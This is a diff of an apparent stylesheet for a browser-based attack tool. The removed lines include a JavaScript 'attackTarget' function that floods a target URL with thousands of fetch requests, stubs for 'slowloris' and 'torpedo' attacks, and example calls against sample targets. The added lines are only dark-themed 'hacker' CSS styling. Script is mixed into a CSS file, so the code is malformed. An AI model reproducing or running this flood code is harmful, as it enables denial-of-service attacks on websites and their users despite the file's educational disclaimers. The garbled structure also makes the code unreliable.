@@ -1,62 +1,111 @@
 /* WARNING: This tool is for educational purposes ONLY. Misuse can lead to severe legal consequences. */
-                 /* DISCLAIMER: The creator is NOT responsible for any damages caused by this tool. Use at your own risk. Bigmancozmo is not responsible for your stupid choices. */
-                 
-                 /* Logger Setup */
-                 body {
-                 background-color: black;
-                 color: white;
-                 font-family: monospace;
-                 }
-                 
-                 .log {
-                 color: #d4ff00; /* Dark Green */
-                 }
-                 
-                 .error {
-                 color: #800080; /* Purple */
-                 }
-                 
-                 .warning {
-                 color: #8b0000; /* Dark Red */
-                 }
-                 
-                 .info {
-                 color: #00008b; /* Dark Blue */
-                 }
-                 
-                 /* Implementation Code */
-                 function attackTarget(targetURL, attackType = 'flood', numRequests = 10000) {
-                     logAction(`Initiating ${attackType.toUpperCase()} attack on ${targetURL}`, 'info');
-                     
-                     if (attackType === 'flood') {
-                         for (let i = 0; i < numRequests; i++) {
-                             try {
-                                 fetch(targetURL, { mode: 'no-cors' })
-                                     .then(() => logAction(`Request ${i + 1} sent to ${targetURL}`, 'log'))
-                                     .catch(error => logAction(`Request ${i + 1} failed: ${error}`, 'error'));
-                             } catch (error) {
-                                 logAction(`Error sending request ${i + 1}: ${error}`, 'error');
-                             }
-                         }
-                     } else if (attackType === 'slowloris') {
-                         // Implement Slowloris attack logic here - omitted for brevity but can be added
-                         logAction('Slowloris attack logic not implemented in this example', 'warning');
-                     } else if (attackType === 'torpedo') {
-                         // Example of a "torpedo" attack targeting specific vulnerabilities - dangerous and illegal
-                         logAction('Torpedo attack targeting specific vulnerabilities is not implemented. You should know this is fucked up and shouldnt do this', 'warning');
-                         // Insert exploit code here for specific vulnerabilities
-                     } else {
-                         logAction('Invalid attack type selected', 'error');
-                     }
-                 }
-                 
-                 function logAction(message, type = 'log') {
-                 const logElement = document.createElement('div');
-                 logElement.classList.add('log', type);
-                 logElement.textContent = `[${new Date().toISOString()}] ${type.toUpperCase()}: ${message}`;
-                 document.body.appendChild(logElement);
-                 }
-                 
-                 // Example usage:
-                 attackTarget('http://example.com', 'flood', 5000);
-                 attackTarget('http://example.onion', 'torpedo');
+/* DISCLAIMER: Noodles Inc. is NOT responsible for any damages caused by this tool. Use at your own risk. Unauthorized use is illegal. */
+
+/* Hacker Aesthetics */
+body {
+    background-color: black;
+    color: #d4ff00; /* Dark Green */
+    font-family: monospace;
+    overflow: hidden; /* Hide scrollbars */
+}
+
+/* Scan Lines */
+body::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1) 1px, transparent 1px, transparent 2px);
+    pointer-events: none;
+    z-index: 1;
+}
+
+/* Particles */
+.particle {
+    position: absolute;
+    width: 5px;
+    height: 5px;
+    background-color: #800080; /* Purple */
+    border-radius: 50%;
+    animation: float 5s infinite linear;
+}
+
+@keyframes float {
+    0% {
+        transform: translateY(0);
+        opacity: 0.5;
+    }
+    50% {
+        transform: translateY(-20px);
+        opacity: 1;
+    }
+    100% {
+        transform: translateY(0);
+        opacity: 0.5;
+    }
+}
+
+/* Logger Setup */
+.log {
+    color: #d4ff00; /* Dark Green */
+}
+
+.error {
+    color: #800080; /* Purple */
+}
+
+.warning {
+    color: #8b0000; /* Dark Red */
+}
+
+.info {
+    color: #00008b; /* Dark Blue */
+}
+
+/* UI Elements */
+button, input[type="text"], textarea {
+    background-color: #222;
+    color: #d4ff00;
+    border: 1px solid #800080;
+    padding: 5px;
+    margin: 5px;
+    font-family: monospace;
+}
+
+button:hover {
+    background-color: #444;
+    cursor: pointer;
+}
+
+/* Layout */
+#container {
+    display: flex;
+    height: 100vh;
+}
+
+#sidebar {
+    width: 200px;
+    background-color: #111;
+    padding: 10px;
+}
+
+#content {
+    flex: 1;
+    padding: 20px;
+}
+
+/* Additional Styling */
+h1, h2, h3 {
+    color: #d4ff00;
+}
+
+a {
+    color: #00008b;
+    text-decoration: none;
+}
+
+a:hover {
+    text-decoration: underline;
+}
